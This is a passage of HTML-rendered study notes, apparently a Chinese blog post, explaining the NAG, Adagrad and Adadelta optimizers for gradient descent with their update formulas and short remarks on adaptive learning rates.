style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord amsrm">▽</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>θ</mi><mi>k</mi></msub><mo>=</mo><msub><mi>θ</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">\theta_k=\theta_{k-1}-v_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul><p><img src="/images/pasted-104.png" alt="NAG" /></p><h4 id="adagrad"><a class="markdownIt-Anchor" href="#adagrad"></a> Adagrad</h4><ul><li><p>Adagrad对不同的参数调整使用不同的学习率，学习率衰减（learning rate decay）</p><ul><li>对非频繁出现特征相关的参数执行较大的更新（即较大的学习率）</li><li>对频繁出现特征相关的参数执行较小的学习率（即较小的学习率)</li></ul></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>g</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>=</mo><mi mathvariant="normal">▽</mi><mi>J</mi><mo stretchy="false">(</mo><msub><mi>θ</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>t</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g_{t,i}=\triangledown J(\theta_{i,t})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord amsrm">▽</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>θ</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo>=</mo><mi>θ</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow><mo>−</mo><mfrac><mi>η</mi><msqrt><mrow><msub><mi>G</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi><mi>i</mi></mrow></msub><mo>+</mo><mi>ε</mi></mrow></msqrt></mfrac><mo>⋅</mo><msub><mi>g</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\theta_{t+1,j}=\theta{t,i}-\frac{\eta}{\sqrt{G_{t,ii}+\varepsilon}}\cdot g_{t,i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord"><span class="mord mathdefault">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.5771000000000002em;vertical-align:-0.8296000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.4986569999999997em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9876328571428572em;"><span class="svg-align" style="top:-3.428571428571429em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="mord mtight" style="padding-left:1.19em;"><span class="mord mtight"><span class="mord mathdefault mtight">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">ε</span></span></span><span style="top:-2.959632857142857em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.5428571428571431em;"><svg width='400em' height='1.5428571428571431em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4689385714285714em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">η</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8296000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>𝐺𝑡是一个对角矩阵，其每一个对角元素是到时间𝑡的梯度的平方之和，即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>t</mi></msubsup><msubsup><mi>g</mi><mi>i</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">\sum^{t}_{i=1}g^2_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.233166em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.933456em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>𝜖 是一个平滑项以避免除以零(通常大小为 1𝑒 − 8).</p></li><li><p>缺点：分母的梯度平方逐步累计变大，可导致学习率不断收缩，收敛变慢，从而失去学习能力</p></li></ul><h4 id="adadelta"><a class="markdownIt-Anchor" href="#adadelta"></a> Adadelta</h4><ul><li>Adagrad的改进版：<ul><li><p>计算历史梯度信息时引入时间窗，而非所有历史时间（引入衰减因子）</p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">[</mo><msup><mi>g</mi><mn>2</mn></msup><msub><mo stretchy="false">]</mo><mi>t</mi></msub><mo>=</mo><mi>γ</mi><mi>E</mi><mo stretchy="false">[</mo><msup><mi>g</mi><mn>2</mn></msup><msub><mo stretchy="false">]</mo><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>γ</mi><mo stretchy="false">)</mo><msup><mi>g</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">E[g^2]_t=\gamma E[g^2]_{t-1}+(1-\gamma)g^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">△</mi><msub><mi>θ</mi><mi>t</mi></msub><mo>=</mo><mo>−</mo><mfrac><mi>η</mi><msqrt><mrow><mi>E</mi><mo stretchy="false">[</mo><msup><mi>g</mi><mn>2</mn></msup><msub><mo stretchy="false">]</mo><mi>t</mi></msub><mo>+</mo><mi>ε</mi></mrow></msqrt></mfrac><msub><mi>g</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\triangle\theta_{t}=-\frac{\eta}{\sqrt{E[g^2]_t+\varepsilon}}g_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">△</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.5771em;vertical-align:-0.8295999999999999em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.4641625em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0369107142857144em;"><span class="svg-align" style="top:-3.428571428571429em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="mord mtight" style="padding-left:1.19em;"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span><span class="mopen mtight">[</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose mtight"><span class="mclose mtight">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">ε</span></span></span><span style="top:-3.0089107142857143em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.5428571428571431em;"><svg width='400em' height='1.5428571428571431em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4196607142857143em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">η</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8295999999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">△</mi><msub><mi>θ</mi><mi>t</mi></msub><mo>=</mo><mo>−</mo><mfrac><mi>η</mi><mrow><mi>R</mi><mi>M</mi><mi>S</mi><mo stretchy="false">[</mo><mi>g</mi><msub><mo stretchy="false">]</mo><mi>t</mi></msub></mrow></mfrac><msub><mi>g</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\triangle\theta_t=-\frac{\eta}{RMS[g]_t}g_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">△</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2675em;vertical-align:-0.52em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span><span class="mord mathdefault mtight" style="margin-right:0.10903em;">M</span><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span><span class="mopen mtight">[</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="mclose mtight"><span class="mclose mtight">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">η</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul></li><li><p>累积参数历史更新量进行加速(类似于动量方法)，由Hessian方法推导出一阶近似Hessian方法</p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">[</mo><mi mathvariant="normal">△</mi><msup><mi>θ</mi><mn>2</mn></msup><msub><mo stretchy="false">]</mo><mi>t</mi></msub><mo>=</mo><mi>γ</mi><mi>E</mi><mo stretchy="false">[</mo><mi 